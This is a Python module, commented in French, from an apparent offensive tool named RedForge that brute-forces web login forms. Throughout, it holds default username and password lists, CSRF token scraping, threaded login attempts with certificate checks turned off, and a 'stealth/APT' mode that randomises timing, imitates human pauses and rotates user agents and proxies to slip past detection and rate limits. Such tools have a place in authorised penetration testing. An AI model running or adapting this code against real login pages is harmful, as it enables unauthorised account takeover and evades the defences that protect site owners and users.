#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de force brute pour RedForge
Attaque par force brute sur les formulaires d'authentification
Version avec support furtif, APT et optimisations avancées
"""

import time
import random
import requests
import hashlib
from typing import Dict, Any, List, Optional, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urlencode
from dataclasses import dataclass, field
from collections import defaultdict
import re

@dataclass
class BruteForceConfig:
    """Configuration avancée pour la force brute"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.1, 0.5)
    delay_between_batches: Tuple[float, float] = (1, 5)
    
    # Threading
    max_threads: int = 10
    batch_size: int = 50
    
    # Comportement
    stop_on_first: bool = True
    randomize_order: bool = True
    respect_rate_limit: bool = True
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    human_behavior: bool = False
    ip_rotation: bool = False
    
    # Proxies
    proxies: List[str] = field(default_factory=list)
    proxy_rotation: bool = False


class BruteForce:
    """Attaque par force brute sur l'authentification avec support furtif"""
    
    def __init__(self, config: Optional[BruteForceConfig] = None):
        """
        Initialise l'attaque par force brute
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or BruteForceConfig()
        
        # Listes par défaut
        self.common_usernames = [
            "admin", "root", "user", "test", "administrator", "webmaster",
            "admin1", "admin2", "admin123", "user1", "test1", "demo",
            "support", "info", "contact", "sales", "marketing", "admin@example.com",
            "sysadmin", "network", "security", "backup", "service", "apache",
            "tomcat", "jboss", "weblogic", "oracle", "mysql", "postgres"
        ]
        
        self.common_passwords = [
            "password", "123456", "12345678", "1234", "qwerty", "abc123",
            "admin", "letmein", "welcome", "monkey", "dragon", "master",
            "sunshine", "password123", "admin123", "passw0rd", "12345", "654321",
            "root", "toor", "raspberry", "changeme", "default", "secret"
        ]
        
        self.common_combinations = [
            ("admin", "admin"), ("admin", "password"), ("root", "root"),
            ("test", "test"), ("user", "user"), ("admin", "123456"),
            ("administrator", "administrator"), ("admin", "passw0rd")
        ]
        
        # User agents pour la furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0'
        ]
        
        # Métriques
        self.attempts_count = 0
        self.success_count = 0
        self.rate_limit_hits = 0
        self.start_time = None
        
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Exécute une attaque de force brute
        
        Args:
            target: URL cible (formulaire de login)
            **kwargs: Options de configuration
                - username: Nom d'utilisateur unique
                - userlist: Liste personnalisée d'utilisateurs
                - password: Mot de passe unique
                - passlist: Liste personnalisée de mots de passe
                - username_field: Nom du champ username
                - password_field: Nom du champ password
                - threads: Nombre de threads
                - delay: Délai entre les tentatives
                - stop_on_find: Arrêter à la première découverte
                - stealth_mode: Mode furtif
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.attempts_count = 0
        self.success_count = 0
        
        # Mettre à jour la configuration avec les kwargs
        self._update_config(kwargs)
        
        print(f"  → Force brute sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Comportement ultra discret")
        
        found_credentials = []
        rate_limits = defaultdict(int)
        
        # Déterminer les listes à utiliser
        usernames = self._get_usernames(kwargs)
        passwords = self._get_passwords(kwargs)
        
        username_field = kwargs.get('username_field', 'username')
        password_field = kwargs.get('password_field', 'password')
        
        # Randomiser les listes pour éviter la détection
        if self.config.randomize_order:
            random.shuffle(usernames)
            random.shuffle(passwords)
        
        total_attempts = len(usernames) * len(passwords)
        print(f"    → {len(usernames)} utilisateurs × {len(passwords)} mots de passe = {total_attempts} tentatives")
        
        # Tester les combinaisons courantes d'abord
        if not self.config.apt_mode or kwargs.get('test_common_first', True):
            found = self._test_common_combinations(
                target, usernames, passwords, 
                username_field, password_field
            )
            found_credentials.extend(found)
        
        # Force brute intelligente
        if not found_credentials or not self.config.stop_on_first:
            # Créer des lots pour le traitement
            attempts = self._generate_attempts(usernames, passwords)
            
            # Traiter par lots
            for i in range(0, len(attempts), self.config.batch_size):
                batch = attempts[i:i + self.config.batch_size]
                
                # Vérifier les rate limits
                if self.config.respect_rate_limit:
                    time.sleep(random.uniform(*self.config.delay_between_batches))
                
                batch_results = self._process_batch(
                    target, batch, username_field, password_field
                )
                
                for result in batch_results:
                    if result['success']:
                        found_credentials.append({
                            "username": result['username'],
                            "password": result['password'],
                            "method": "brute_force",
                            "response_time": result.get('response_time'),
                            "status_code": result.get('status_code')
                        })
                        print(f"      ✓ Trouvé: {result['username']}:{result['password']}")
                        
                        if self.config.stop_on_first:
                            return self._generate_results(
                                target, found_credentials, total_attempts
                            )
                
                # Pause APT
                if self.config.apt_mode and self.config.human_behavior:
                    self._apt_pause()
        
        return self._generate_results(target, found_credentials, total_attempts)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        # Paramètres de threading et délais
        if 'threads' in kwargs:
            self.config.max_threads = kwargs['threads']
        if 'delay' in kwargs:
            self.config.delay_between_requests = (kwargs['delay'], kwargs['delay'] * 2)
        if 'stop_on_find' in kwargs:
            self.config.stop_on_first = kwargs['stop_on_find']
        
        # Mode furtif
        if kwargs.get('stealth_mode', False):
            self.config.stealth_headers = True
            self.config.random_user_agents = True
            self.config.random_delays = True
            self.config.max_threads = min(self.config.max_threads, 3)
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.human_behavior = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.max_threads = 1
            self.config.delay_between_requests = (5, 15)
            self.config.delay_between_batches = (30, 180)
        
        # Délais spécifiques
        if 'delay_between_requests' in kwargs:
            self.config.delay_between_requests = kwargs['delay_between_requests']
        if 'max_threads' in kwargs:
            self.config.max_threads = kwargs['max_threads']
    
    def _test_common_combinations(self, target: str, usernames: List[str], 
                                  passwords: List[str], username_field: str, 
                                  password_field: str) -> List[Dict]:
        """Teste les combinaisons courantes"""
        found = []
        
        for username, password in self.common_combinations:
            if username in usernames and password in passwords:
                # Pause APT avant le test
                if self.config.apt_mode:
                    self._apt_pause()
                
                result = self._test_login(
                    target, username, password, 
                    username_field, password_field
                )
                
                if result['success']:
                    found.append({
                        "username": username,
                        "password": password,
                        "method": "common_combinations"
                    })
                    print(f"      ✓ Trouvé (combinaison commune): {username}:{password}")
                    
                    if self.config.stop_on_first:
                        break
        
        return found
    
    def _generate_attempts(self, usernames: List[str], 
                          passwords: List[str]) -> List[Tuple[str, str]]:
        """Génère la liste des tentatives"""
        attempts = []
        
        # Stratégie intelligente pour mode APT
        if self.config.apt_mode:
            # Tester d'abord les mots de passe faibles sur tous les users
            weak_passwords = [p for p in passwords if len(p) < 8]
            for username in usernames[:10]:  # Limiter en mode APT
                for password in weak_passwords[:20]:
                    attempts.append((username, password))
            
            # Puis tester les combinaisons probables
            common_patterns = ['123', 'admin', 'password', 'welcome', 'changeme']
            for username in usernames[:5]:
                for pattern in common_patterns:
                    attempts.append((username, pattern))
                    if username.lower() in pattern or pattern in username.lower():
                        attempts.append((username, f"{username}{pattern}"))
        else:
            # Mode normal - toutes les combinaisons
            for username in usernames:
                for password in passwords:
                    attempts.append((username, password))
        
        # Randomiser l'ordre pour éviter la détection
        if self.config.randomize_order:
            random.shuffle(attempts)
        
        return attempts
    
    def _process_batch(self, target: str, batch: List[Tuple[str, str]],
                      username_field: str, password_field: str) -> List[Dict]:
        """Traite un lot de tentatives"""
        results = []
        
        with ThreadPoolExecutor(max_workers=self.config.max_threads) as executor:
            futures = {}
            
            for username, password in batch:
                future = executor.submit(
                    self._test_login, target, username, password,
                    username_field, password_field
                )
                futures[future] = (username, password)
                
                # Délai entre les requêtes
                if self.config.random_delays:
                    delay = random.uniform(*self.config.delay_between_requests)
                else:
                    delay = self.config.delay_between_requests[1]
                
                time.sleep(delay)
            
            for future in as_completed(futures):
                username, password = futures[future]
                result = future.result()
                result['username'] = username
                result['password'] = password
                results.append(result)
                
                self.attempts_count += 1
                if result['success']:
                    self.success_count += 1
        
        return results
    
    def _test_login(self, target: str, username: str, password: str,
                    username_field: str, password_field: str) -> Dict[str, Any]:
        """
        Teste une combinaison username/password avec options furtives
        
        Args:
            target: URL de login
            username: Nom d'utilisateur
            password: Mot de passe
            username_field: Nom du champ username
            password_field: Nom du champ password
        """
        result = {
            "success": False,
            "username": username,
            "password": password,
            "status_code": None,
            "response_time": None
        }
        
        try:
            # Préparer la requête
            session = requests.Session()
            
            # Headers furtifs
            headers = {
                'User-Agent': random.choice(self.user_agents) if self.config.random_user_agents else self.user_agents[0],
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1'
            }
            
            if self.config.stealth_headers:
                headers['Referer'] = target
                headers['Origin'] = urlparse(target).scheme + '://' + urlparse(target).netloc
            
            data = {
                username_field: username,
                password_field: password
            }
            
            # Ajouter un token CSRF si détecté
            csrf_token = self._extract_csrf_token(target, session)
            if csrf_token:
                data['csrf_token'] = csrf_token
            
            # Mesurer le temps de réponse
            start_time = time.time()
            response = session.post(
                target, data=data, headers=headers, 
                timeout=10, verify=False, allow_redirects=False
            )
            result["response_time"] = time.time() - start_time
            result["status_code"] = response.status_code
            
            # Détection avancée de succès
            result["success"] = self._is_login_successful(response)
            
            # Rate limiting detection
            if response.status_code == 429 or 'too many' in response.text.lower():
                self.rate_limit_hits += 1
                
        except requests.exceptions.Timeout:
            result["error"] = "Timeout"
        except requests.exceptions.ConnectionError:
            result["error"] = "Connection error"
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def _extract_csrf_token(self, target: str, session: requests.Session) -> Optional[str]:
        """Extrait un token CSRF de la page de login"""
        try:
            response = session.get(target, timeout=5, verify=False)
            
            # Patterns courants pour les tokens CSRF
            patterns = [
                r'name="csrf_token"\s+value="([^"]+)"',
                r'name="csrf"\s+value="([^"]+)"',
                r'name="_token"\s+value="([^"]+)"',
                r'name="authenticity_token"\s+value="([^"]+)"'
            ]
            
            for pattern in patterns:
                match = re.search(pattern, response.text)
                if match:
                    return match.group(1)
        except:
            pass
        
        return None
    
    def _is_login_successful(self, response: requests.Response) -> bool:
        """Détermine si la tentative de login a réussi"""
        # Indicateurs de succès
        success_indicators = [
            response.status_code == 302,  # Redirection après login
            'dashboard' in response.text.lower(),
            'welcome' in response.text.lower(),
            'success' in response.text.lower(),
            'admin' in response.text.lower(),
            'logged in' in response.text.lower(),
            'redirect' in response.headers.get('Location', '').lower()
        ]
        
        # Indicateurs d'échec
        failure_indicators = [
            'invalid' in response.text.lower(),
            'incorrect' in response.text.lower(),
            'failed' in response.text.lower(),
            'error' in response.text.lower(),
            'try again' in response.text.lower(),
            'invalid username' in response.text.lower(),
            'invalid password' in response.text.lower()
        ]
        
        # Succès seulement si au moins un indicateur de succès est présent
        # et aucun indicateur d'échec (ou très peu)
        success_score = sum(1 for ind in success_indicators if ind)
        failure_score = sum(1 for ind in failure_indicators if ind)
        
        return success_score > 0 and failure_score == 0
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        # Périodes d'inactivité variables
        if random.random() < 0.3:  # 30% de chance de pause
            pause_duration = random.uniform(30, 180)  # 30s à 3min
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _get_usernames(self, kwargs: Dict) -> List[str]:
        """Récupère la liste des usernames à tester"""
        if kwargs.get('username'):
            return [kwargs['username']]
        elif kwargs.get('userlist'):
            try:
                with open(kwargs['userlist'], 'r') as f:
                    usernames = [line.strip() for line in f if line.strip()]
                    print(f"    → {len(usernames)} utilisateurs chargés depuis {kwargs['userlist']}")
                    return usernames
            except Exception as e:
                print(f"    ⚠️ Erreur chargement userlist: {e}")
                return self.common_usernames
        else:
            return self.common_usernames
    
    def _get_passwords(self, kwargs: Dict) -> List[str]:
        """Récupère la liste des passwords à tester"""
        if kwargs.get('password'):
            return [kwargs['password']]
        elif kwargs.get('passlist'):
            try:
                with open(kwargs['passlist'], 'r') as f:
                    passwords = [line.strip() for line in f if line.strip()]
                    print(f"    → {len(passwords)} mots de passe chargés depuis {kwargs['passlist']}")
                    return passwords
            except Exception as e:
                print(f"    ⚠️ Erreur chargement passlist: {e}")
                return self.common_passwords
        else:
            return self.common_passwords
    
    def _generate_results(self, target: str, found_credentials: List[Dict], 
                         total_attempts: int) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        results = {
            "target": target,
            "found_credentials": found_credentials,
            "total_attempts": total_attempts,
            "actual_attempts": self.attempts_count,
            "successful_attempts": len(found_credentials),
            "duration_seconds": duration,
            "attempts_per_second": self.attempts_count / duration if duration > 0 else 0,
            "rate_limit_hits": self.rate_limit_hits,
            "config": {
                "apt_mode": self.config.apt_mode,
                "max_threads": self.config.max_threads,
                "stealth_headers": self.config.stealth_headers
            },
            "summary": self._generate_summary(found_credentials)
        }
        
        # Ajouter des métriques de performance
        if self.attempts_count > 0:
            results["success_rate"] = (len(found_credentials) / self.attempts_count) * 100
        
        return results
    
    def _generate_summary(self, found_credentials: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des résultats"""
        return {
            "total_found": len(found_credentials),
            "by_method": {
                "common_combinations": len([c for c in found_credentials if c.get('method') == 'common_combinations']),
                "brute_force": len([c for c in found_credentials if c.get('method') == 'brute_force'])
            },
            "severity": "CRITICAL" if len(found_credentials) > 0 else "INFO"
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    bf = BruteForce()
    results = bf.scan("https://example.com/login", username="admin", passlist="passwords.txt")
    print(f"Credentials trouvés: {len(results['found_credentials'])}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = BruteForceConfig(apt_mode=True, human_behavior=True, max_threads=1)
    bf_apt = BruteForce(config=apt_config)
    results_apt = bf_apt.scan("https://example.com/login", stealth_mode=True)
    print(f"Credentials trouvés (APT): {len(results_apt['found_credentials'])}")